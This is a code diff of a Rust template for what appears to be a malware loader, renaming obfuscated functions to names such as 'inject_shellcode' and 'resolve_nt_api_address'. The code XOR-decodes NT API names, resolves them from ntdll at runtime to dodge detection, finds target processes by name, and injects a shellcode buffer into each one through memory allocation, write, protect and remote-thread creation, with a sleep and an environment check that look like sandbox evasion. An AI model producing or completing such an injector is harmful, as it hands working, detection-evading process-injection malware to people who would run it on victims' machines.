@@ -44,14 +44,14 @@ const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
 const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
 const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};
 
-fn r(d: &[u8]) -> Vec<u8> {
+fn deobfuscate_bytes(d: &[u8]) -> Vec<u8> {
     d.iter().map(|b| b ^ K).collect()
 }
 
-unsafe fn g(n: &[u8]) -> *const () {
+unsafe fn resolve_nt_api_address(n: &[u8]) -> *const () {
     let ntdll = CString::new(lc!("ntdll")).unwrap();
     let h = GetModuleHandleA(ntdll.as_ptr());
-    let s = r(n);
+    let s = deobfuscate_bytes(n);
     let c = CString::new(s).unwrap();
     GetProcAddress(h, c.as_ptr()) as *const ()
 }
@@ -63,7 +63,7 @@ type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *
 type FE = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> i32;
 type FH = unsafe extern "system" fn(u32, *const i64) -> i32;
 
-fn boxboxbox(tar: &str) -> Vec<usize> {
+fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
     let tar_lower = tar.to_lowercase();
@@ -77,7 +77,7 @@ fn boxboxbox(tar: &str) -> Vec<usize> {
 
 fn pause(ms: i64) {
     unsafe {
-        let f: FH = std::mem::transmute(g(OBF_H));
+        let f: FH = std::mem::transmute(resolve_nt_api_address(OBF_H));
         let interval: i64 = -(ms * 10_000);
         f(0, &interval);
     }
@@ -90,7 +90,7 @@ fn check_environment() -> bool {
 }
 
 
-fn enhance(mut buf: Vec<u8>, tar: usize) {
+fn inject_shellcode(mut buf: Vec<u8>, tar: usize) {
     let mut process_handle = tar as HANDLE;
     let mut oa = OBJECT_ATTRIBUTES::default();
     let mut ci = CID {
@@ -99,11 +99,11 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
     };
 
     unsafe {
-        let f_open: FA = std::mem::transmute(g(OBF_A));
-        let f_alloc: FB = std::mem::transmute(g(OBF_B));
-        let f_write: FC = std::mem::transmute(g(OBF_C));
-        let f_protect: FD = std::mem::transmute(g(OBF_D));
-        let f_thread: FE = std::mem::transmute(g(OBF_E));
+        let f_open: FA = std::mem::transmute(resolve_nt_api_address(OBF_A));
+        let f_alloc: FB = std::mem::transmute(resolve_nt_api_address(OBF_B));
+        let f_write: FC = std::mem::transmute(resolve_nt_api_address(OBF_C));
+        let f_protect: FD = std::mem::transmute(resolve_nt_api_address(OBF_D));
+        let f_thread: FE = std::mem::transmute(resolve_nt_api_address(OBF_E));
 
         let s = f_open(&mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
         if !NT_SUCCESS(s) { return; }
@@ -149,10 +149,10 @@ fn main() {
 
     {{MAIN}}
 
-    let list: Vec<usize> = boxboxbox(&tar);
+    let list: Vec<usize> = find_process_ids_by_name(&tar);
     if !list.is_empty() {
         for i in &list {
-            enhance(vec.clone(), *i);
+            inject_shellcode(vec.clone(), *i);
         }
     }
 }
